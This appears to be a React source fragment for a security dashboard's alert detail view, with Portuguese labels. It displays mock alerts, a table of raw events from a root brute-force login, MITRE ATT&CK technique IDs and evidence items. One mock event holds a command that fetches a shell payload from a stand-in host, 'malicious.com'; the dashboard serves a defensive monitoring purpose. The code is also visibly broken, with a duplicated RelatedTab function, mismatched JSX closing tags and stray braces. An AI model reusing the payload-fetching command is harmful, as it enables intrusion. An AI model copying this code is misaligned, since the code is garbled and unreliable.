// Continuation of AlertDetailDrawer - Related Alerts Tab
function RelatedTab({ alert }: { alert: any }) {
  const relatedAlerts = [
    { id: "ALT-20260804-002", title: "Malware Execution", severity: "critical", status: "open", rule: "malware-exec" },
    { id: "ALT-20260804-003", title: "Lateral Movement - SMB", severity: "high", status: "in_progress", rule: "lateral-movement" },
    { id: "ALT-20260804-005", title: "Data Exfiltration - Cloud", severity: "high", status: "open", rule: "data-exfil" },
  ];

  return (
    <div style={{ padding: spacing["4"] }}>
      <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: spacing["3"] }}>
        <h3 style={{ fontSize: typography.size.lg, fontWeight: typography.weight.semibold }}>Alertas Relacionados</h3>
        <span style={{ fontSize: typography.size.sm, color: "colors.textMuted" }}>
          {relatedAlerts.length} alertas relacionados
        </span>
      </div>
      <div style={{ display: "flex", flexDirection: "column", gap: spacing["2"] }}>
        {relatedAlerts.map((related) => (
          <div
            key={related.id}
            style={{
              display: "flex",
              justifyContent: "space-between",
              alignItems: "center",
              padding: `${spacing["3"]} ${spacing["4"]}`,
              background: colors.surface,
              border: `1px solid ${colors.border}`,
              borderRadius: "8px",
              marginBottom: spacing["2"],
            }}
          >
            <div style={{ display: "flex", alignItems: "center", gap: spacing["3"], flex: 1 }}>
              <SeverityBadge severity={related.severity}>
                {related.severity.charAt(0).toUpperCase() + related.severity.slice(1)}
              </SeverityBadge>
              <div style={{ flex: 1 }}>
                <div style={{ fontWeight: 600, color: colors.textPrimary }}>{related.title}</div>
                <div style={{ fontSize: typography.size.xs, color: colors.textMuted }}>
                  Regra: {related.rule} • {related.sourceHost || "host desconhecido"}
                </div>
              </div>
              <SeverityBadge severity={related.severity as any} />
            </div>
          ))}
        </div>
      </div>
    );
  }
}

function EventsTab({ alert }: { alert: any }) {
  return (
    <div style={{ padding: spacing["4"] }}>
      <p style={{ color: colors.textMuted, marginBottom: spacing["4"] }}>
        Eventos brutos que compõem este alerta (últimos 100 eventos)
      </p>
      <div style={{ maxHeight: 400, overflow: "auto" }}>
        <table style={{ width: "100%", borderCollapse: "collapse", fontSize: typography.size.sm }}>
          <thead>
            <tr style={{ borderBottom: `2px solid ${colors.border}` }}>
              <th style={thStyle}>Timestamp</th>
              <th style={thStyle}>Tipo</th>
              <th style={thStyle}>Origem</th>
              <th style={thStyle}>Destino</th>
              <th style={thStyle}>Ação</th>
              <th style={thStyle}>Detalhes</th>
            </tr>
          </thead>
          <tbody>
            {[
              { ts: "2026-08-04T10:15:00", type: "auth", src: "192.168.1.100", dst: "10.0.1.45", action: "login_failed", detail: "Failed password for root from 192.168.1.100" },
              { ts: "2026-08-04T10:15:02", type: "auth", src: "192.168.1.100", dst: "10.0.0.1", action: "login_failed", detail: "Failed password for root from 192.168.1.100" },
              { ts: "2026-08-04T10:15:01", type: "auth", src: "192.168.1.100", dst: "10.0.0.1", action: "login_failed", detail: "Failed password for root" },
              { ts: "2026-08-04T10:15:03", type: "auth", src: "192.168.1.100", dst: "10.0.0.1", action: "login_failed", detail: "Failed password for root" },
              { ts: "2026-08-04T10:15:04", type: "auth", src: "192.168.1.100", dst: "10.0.0.1", action: "login_failed", detail: "Failed password for root" },
              { ts: "2026-08-04T10:15:04", type: "auth", src: "192.168.1.100", dst: "10.0.0.1", action: "login_failed", detail: "Failed password for root" },
              { ts: "2026-08-04T10:15:05", type: "auth", src: "192.168.1.100", dst: "10.0.0.1", action: "login_success", detail: "Accepted password for root" },
              { ts: "2026-08-04T10:16:00", type: "process", src: "10.0.1.45", dst: "malicious.com", action: "network_connection", detail: "wget http://malicious.com/payload.sh" },
            ].map((row, i) => (
              <tr key={i} style={{ borderBottom: `1px solid ${colors.borderSubtle}` }}>
                <td style={tdStyle}>{row.ts}</td>
                <td style={tdStyle}><SeverityBadge severity="high">{row.type}</SeverityBadge></td>
                <td style={tdStyle}>{row.src}</td>
                <td style={tdStyle}>{row.dst}</td>
                <td style={tdStyle}><CodeBadge>{row.action}</CodeBadge></td>
                <td style={{ ...tdStyle, maxWidth: 300, textOverflow: "ellipsis", overflow: "hidden", whiteSpace: "nowrap" }}>{row.detail}</td>
              </tr>
            ))}
          </tbody>
        </table>
      </div>
    );
  }
}

function RelatedTab({ alert }: { alert: any }) {
  const related = [
    { id: "ALT-002", title: "Malware Execution", severity: "critical", status: "open", rule: "malware-exec" },
    { id: "ALT-003", title: "Lateral Movement - SMB", severity: "high", status: "in_progress", rule: "lateral-smb" },
    { id: "ALT-005", title: "Data Exfiltration", severity: "high", status: "open", rule: "data-exfil" },
  ];

  return (
    <div style={{ padding: spacing["4"] }}>
      <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: spacing["3"] }}>
        <h3 style={{ fontSize: typography.size.lg, fontWeight: typography.weight.semibold }}>Alertas Relacionados</h3>
        <span style={{ fontSize: typography.size.sm, color: colors.textMuted }}>
          {3} alertas relacionados
        </span>
      </div>
      <div style={{ display: "flex", flexDirection: "column", gap: spacing["2"] }}>
        {[
          { id: "ALT-002", title: "Malware Execution", severity: "critical", status: "open", rule: "malware-exec" },
          { id: "ALT-003", title: "Lateral Movement - SMB", severity: "high", status: "in_progress", rule: "lateral-smb" },
          { id: "ALT-005", title: "Data Exfiltration", severity: "high", status: "open", rule: "data-exfil" },
        ].map((r) => (
          <div
            key={r.id}
            style={{
              display: "flex",
              justifyContent: "space-between",
              alignItems: "center",
              padding: `${spacing["3"]} ${spacing["4"]}`,
              background: colors.surface,
              border: `1px solid ${colors.border}`,
              borderRadius: "8px",
              marginBottom: spacing["2"],
            }}
            >
              <div style={{ display: "flex", alignItems: "center", gap: spacing["3"], flex: 1 }}>
                <SeverityBadge severity={r.severity as any}>
                  {r.severity.charAt(0).toUpperCase() + r.severity.slice(1)}
                </SeverityBadge>
                <div style={{ flex: 1 }}>
                  <div style={{ fontWeight: 600, color: colors.textPrimary }}>{r.title}</div>
                  <div style={{ fontSize: typography.size.xs, color: colors.textMuted }}>
                    Regra: {r.rule} • Host: {r.sourceHost || "—"}
                  </div>
                </div>
                <SeverityBadge severity={r.severity as any} />
              </div>
            ))}
          </div>
        </div>
      </div>
    );
  }
}

function SummaryTab({ alert }: { alert: any }) {
  return (
    <div style={{ padding: spacing["4"] }}>
      <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fit, minmax(200px, 1fr))", gap: spacing["4"], marginBottom: spacing["4"] }}>
        <Card title="Resumo do Risco">
          <div style={{ display: "flex", alignItems: "center", gap: spacing["3"] }}>
            <div style={{ width: 80, height: 80, borderRadius: "50%", background: "linear-gradient(135deg, #F85149, #DB6E28)", display: "flex", alignItems: "center", justifyContent: "center", fontSize: "32px", fontWeight: "bold", color: "white" }}>
              85
            </div>
            <div>
              <div style={{ fontSize: typography.size.xs, color: colors.textMuted }}>Risk Score</div>
              <div style={{ fontSize: "36px", fontWeight: 700, color: "#F85149" }}>85</div>
              <div style={{ fontSize: typography.size.xs, color: colors.textMuted }}>Crítico</div>
            </div>
          </Card>

          <Card title="Origem">
            <div style={{ display: "flex", flexDirection: "column", gap: 4 }}>
              <div><strong>Host:</strong> web-01.prod.internal</div>
              <div><strong>IP:</strong> 10.0.1.45</div>
              <div><strong>Usuário:</strong> root</div>
              <div><strong>Processo:</strong> payload.sh (PID 12455)</div>
            </div>
          </Card>

          <Card title="MITRE ATT&CK">
            <div style={{ display: "flex", flexWrap: "wrap", gap: 8 }}>
              {["T1110.001", "T1059.001", "T1059.003", "T1021.002", "T1041"].map((t) => (
                <span key={t} style={{
                  padding: "4px 10px",
                  background: colors.surfaceAlt,
                  border: `1px solid ${colors.border}`,
                  borderRadius: 9999,
                  fontSize: typography.size.xs,
                  fontFamily: "monospace",
                  color: colors.textSecondary,
                }}>{t}</span>
              )}
            </div>
          </Card>
        </div>
      </div>

      <div style={{ marginTop: spacing["4"] }}>
        <h3 style={{ fontSize: typography.size.lg, marginBottom: spacing["3"] }}>Evidências Coletadas</h3>
        <div style={{ display: "flex", flexWrap: "wrap", gap: spacing["2"] }}>
          {[
            { label: "Arquivo", value: "payload.sh", type: "file" },
            { label: "Hash SHA256", value: "a1b2c3d4...", type: "hash" },
            { label: "IP C2", value: "192.168.1.100:4444", type: "ip" },
            { label: "Domínio C2", value: "malicious.com", type: "domain" },
            { label: "User-Agent", value: "Wget/1.21", type: "ua" },
          ].map((e) => (
            <div key={e.label} style={{
              background: colors.surfaceAlt,
              border: `1px solid ${colors.border}`,
              borderRadius: 8,
              padding: "8px 12px",
              display: "flex",
              flexDirection: "column",
              gap: 2,
              minWidth: 160,
            }}>
              <div style={{ fontSize: "10px", color: colors.textMuted, textTransform: "uppercase" }}>{e.type}</div>
              <div style={{ fontFamily: "monospace", fontSize: "13px", wordBreak: "break-all" }}>{e.value}</div>
            </div>
          ))}
        </div>
      </div>
    </div>
  );
}